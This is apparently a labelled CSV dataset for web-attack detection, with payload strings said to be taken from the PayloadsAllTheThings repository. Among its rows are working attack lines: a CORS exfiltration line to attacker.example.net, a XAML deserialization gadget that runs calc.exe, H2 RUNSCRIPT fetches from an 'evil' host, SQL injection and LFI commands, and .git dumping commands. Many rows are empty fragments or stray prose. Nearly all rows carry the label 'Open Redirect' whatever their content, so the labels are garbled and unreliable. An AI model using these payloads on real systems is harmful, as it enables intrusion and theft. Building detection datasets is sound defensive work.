Payload,Signature,AttackType,Severity,MITRE,Label,Description
"  $target = ""http://#{$target}""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# origin : https://github.com/noperator/CVE-2019-18935,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<iframe src=""http://target site"" security=""restricted""></iframe>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<iframe src=""http://target site"" sandbox></iframe>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<iframe src=""http://target site"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"window.top.location = ""http://attacker.site/204.php"";",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<iframe src=""http://target site"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<iframe src=""https://legitimate-site.com/login"" width=""500"" height=""500""></iframe>",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    payload_1 = ""<soapenv:Envelope xmlns:soapenv=\""http://schemas.xmlsoap.org/soap/envelope/\""> \n"" \",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                ""       <work:WorkContext xmlns:work=\""http://bea.com/2004/06/soap/workarea/\""> \n"" \",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Origin: https://evil.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Access-Control-Allow-Origin: https://evil.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Origin: https://evil.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Origin: https://evilexample.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Access-Control-Allow-Origin: https://evilexample.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Origin: https://apiiexample.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Access-Control-Allow-Origin: https://apiiexample.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Origin: https://evil.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Access-Control-Allow-Origin: https://evil.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"./kadimus -u ""http://example.com/index.php?page=vuln"" -S -f ""index.php%00"" -O index.php --parameter page",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"curl ""http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"" | base64 -d > index.php",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[*] The following URL is targeted : http://127.0.0.1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,High,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- Backend must not use """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a ",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
firefox --screenshot https://www.google.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,XSS_Script,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - WCMN alternative using Python to fix the websocket connection with an empty """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Node inspector """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"1. Chrome will make 2 DNS requests: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The """,XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$ git clone https://gitlab.com/dee-see/graphql-path-enum,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27,SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --backup,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/C39AB19B83398A76A21E0CD04EC9B14C.cache.js,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --backup -p http://127.0.0.1:8080,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService.login,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService --rpc --color,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService.login --rpc --probe,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"x8 -u ""https://example.com/"" -w <wordlist>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"x8 -u ""https://example.com/"" -X POST -w <wordlist>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start""><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The vulnerable sinks are now """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""http://evil/spel.xml""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""url"":""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'""",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""url"":""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'""",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"!!java.net.URL [""http://attacker-ip/""]",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"| base64        | """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"| AES CBC/PKCS5Padding | """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Decimal value: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Name: """,SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* UUID/GUID v1 can be predicted if you know the time they were created: """,SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Send a wildcard (""",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
nuclei -t http/default-logins -u https://example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
nuclei -t http/exposures -u https://example.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"python3 dumper.py -u ""http://127.0.0.1:5000/"" -o source",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[!] Target : http://127.0.0.1:5000/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./git-dumper.py http://web.site/.git ~/website,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"perl rip-git.pl -v -u ""http://web.site/.git/""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
GitHack.py http://web.site/.git/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
./gitdumper.sh http://target.tld/.git/ /tmp/destdir,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
git clone https://github.com/trufflesecurity/test_keys,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
noseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
go get github.com/nielsing/yar # https://github.com/nielsing/yar,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
